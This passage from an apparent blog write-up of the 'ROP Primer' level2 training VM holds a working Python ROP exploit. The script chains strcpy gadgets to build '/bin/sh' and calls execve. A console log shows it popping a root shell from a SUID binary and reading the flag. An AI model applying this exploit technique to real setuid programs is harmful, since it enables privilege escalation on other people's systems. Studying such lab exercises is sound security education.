<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span><span class='line'>
</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">44</span>
</span><span class='line'><span class="n">badchars</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x00\x09\x0a\x20</span><span class="s">&quot;</span>   <span class="c"># List of bad characters.</span>
</span><span class='line'><span class="n">bss</span> <span class="o">=</span> <span class="mh">0x080cab40</span>                <span class="c"># The address of the BSS section.</span>
</span><span class='line'><span class="n">execvenb</span> <span class="o">=</span> <span class="mi">11</span>                   <span class="c"># System call execve number.</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Functions.</span>
</span><span class='line'><span class="n">bssaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span><span class="p">)</span>
</span><span class='line'><span class="n">strcpyaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08051160</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Gadgets.</span>
</span><span class='line'><span class="n">boom</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x41424344</span><span class="p">)</span>     <span class="c"># dummy</span>
</span><span class='line'><span class="n">pop2</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048893</span><span class="p">)</span>
</span><span class='line'><span class="n">syscall</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08052ba0</span><span class="p">)</span>
</span><span class='line'><span class="n">xoreax</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0808d2cd</span><span class="p">)</span>   <span class="c"># xor eax,eax|pop ebp|ret</span>
</span><span class='line'><span class="n">inceax</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08083d82</span><span class="p">)</span>   <span class="c"># inc eax|ret</span>
</span><span class='line'><span class="n">movedx</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08078e71</span><span class="p">)</span>   <span class="c"># mov dword ptr [edx],eax|ret</span>
</span><span class='line'><span class="n">popedx</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08052476</span><span class="p">)</span>
</span><span class='line'><span class="n">popebx</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0805249e</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Characters.</span>
</span><span class='line'><span class="n">slashaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048483</span><span class="p">)</span>
</span><span class='line'><span class="n">baddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0804b262</span><span class="p">)</span>
</span><span class='line'><span class="n">iaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0804a0ca</span><span class="p">)</span>
</span><span class='line'><span class="n">naddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048b65</span><span class="p">)</span>
</span><span class='line'><span class="n">saddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048110</span><span class="p">)</span>
</span><span class='line'><span class="n">haddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048113</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">slashaddr</span>  <span class="c"># /</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">baddr</span>      <span class="c"># b</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">iaddr</span>      <span class="c"># i</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">naddr</span>      <span class="c"># n</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">slashaddr</span>  <span class="c"># /</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="n">saddr</span>      <span class="c"># s</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="n">haddr</span>      <span class="c"># h</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">xoreax</span> <span class="o">+</span> <span class="n">boom</span>                <span class="c"># The xor gadget also pops.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">popedx</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="c"># Put the address of BSS + 7.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">movedx</span>                       <span class="c"># Store a NUL after the string.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">xoreax</span> <span class="o">+</span> <span class="n">boom</span>                <span class="c"># The xor gadget also pops.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">inceax</span> <span class="o">*</span> <span class="n">execvenb</span>            <span class="c"># eax = 11.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">popebx</span> <span class="o">+</span> <span class="n">bssaddr</span>             <span class="c"># ebx = &quot;/bin/sh\0&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">syscall</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>In conclusion, the execution of the SUID binary with the payload as an argument
to capture the flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level2@rop:~$</span> ./level2 <span class="sb">`</span>python boom.py<span class="sb">`</span>
</span><span class='line'><span class="go">[+] ROP tutorial level2</span>
</span><span class='line'><span class="go">[+] Bet you can&#39;t ROP me this time around, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA#@#</span>
</span><span class='line'><span class="go">                                                                                              ##A#</span>
</span><span class='line'><span class="go">                                                                                                b#B#</span>
</span><span class='line'><span class="go">                                                                                                   #C#</span>
</span><span class='line'><span class="go">                                                                                                     e#D#</span>
</span><span class='line'><span class="go">                                                                                                        ##E#</span>
</span><span class='line'><span class="go">                                                                                                           #F#</span>
</span><span class='line'><span class="go">                                                                                                           DCBAvG#</span>
</span><span class='line'><span class="go">                                                                                                                DCBA#@#</span>
</span><span class='line'><span class="go">                                                                                                                      #!</span>
</span><span class='line'><span class="gp">#</span> cat flag
</span><span class='line'><span class="go">flag{to_rop_or_not_to_rop}</span>
</span></code></pre></td></tr></table></div></figure>

</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">tcunha</span></span>

      




<time class='entry-date' datetime='2015-11-12T01:31:07+00:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:31 am</span></time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/rop/'>rop</a>, <a class='category' href='/blog/categories/vm/'>vm</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://tcunha.github.io/blog/2015/11/12/rop-primer-0-dot-2/" data-via="" data-counturl="http://tcunha.github.io/blog/2015/11/12/rop-primer-0-dot-2/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
      
        <a class="basic-alignment right" href="/blog/2015/12/29/protostar-stack/" title="Next Post: Protostar stack">Protostar stack &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2018/06/19/slae-0x03-egghunter/">SLAE 0x03: Egghunter</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/05/21/slae-0x02-reverse-tcp-shell/">SLAE 0x02: Reverse TCP Shell</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/05/20/slae-0x01-bind-tcp-shell/">SLAE 0x01: Bind TCP Shell</a>
      </li>
    
      <li class="post">
        <a href="/blog/2017/11/01/vulnerable-docker-vm-hard/">Vulnerable Docker VM: Hard</a>
      </li>
    
      <li class="post">
        <a href="/blog/2017/11/01/vulnerable-docker-vm-easy/">Vulnerable Docker VM: Easy</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2018 - tcunha -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
